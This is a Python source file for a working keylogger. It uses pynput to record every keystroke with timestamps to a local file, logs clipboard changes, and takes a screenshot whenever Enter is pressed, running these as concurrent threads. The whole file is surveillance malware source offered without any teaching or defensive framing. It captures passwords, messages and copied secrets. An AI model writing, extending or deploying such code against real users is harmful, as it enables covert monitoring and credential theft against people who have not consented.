from pynput.keyboard import Listener,Key
from datetime import datetime
import time
import os
import pyautogui 
import pyperclip
from concurrent.futures import ThreadPoolExecutor


if not os.path.exists("screenshots"):
    os.makedirs("screenshots")

        
def timestamp():
        timestamp=datetime.now().strftime("%m-%d %H:%M:%S")
        return timestamp

def clipboard():
    old_clipboard= ""
    while True:
         clipboard = pyperclip.paste()
         if clipboard !=old_clipboard and clipboard !="": 
            with open("clipboard_log.txt","a") as c:
                c.write(f"[{timestamp()}]:{clipboard}\n")
                old_clipboard=clipboard #to update old clipboard
                time.sleep(5)

def write(key):
    keydata=str(key)

    keydata=keydata.replace("'","")
    keydata=keydata.replace("Key.space","[SPACE]")
    keydata=keydata.replace("Key.enter","[ENTER]")
    keydata=keydata.replace("Key.shift","[SHIFT]")
    keydata=keydata.replace("Key.tab","\t")
    keydata=keydata.replace("Key.backspace","[BACKSPACE]")
    keydata=keydata.replace("Key.caps_lock","[CAPS]")
    keydata=keydata.replace("Key.alt","[ALT]")
    keydata=keydata.replace("Key.delete","[DELETE]")
    keydata=keydata.replace("Key.cmd","[CMD]")


    with open("key_log.txt","a") as f:
        f.write(f"[{timestamp()}]:{keydata}\n")


    if key==Key.enter:
        time=datetime.now().strftime("%H-%M-%S")
        screenshot_path = os.path.join("screenshots", f"screen_{time}.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        
def listener():
    with Listener(on_press=write) as l:
        l.join()

with ThreadPoolExecutor() as executor:
    executor.submit(clipboard)
    executor.submit(listener)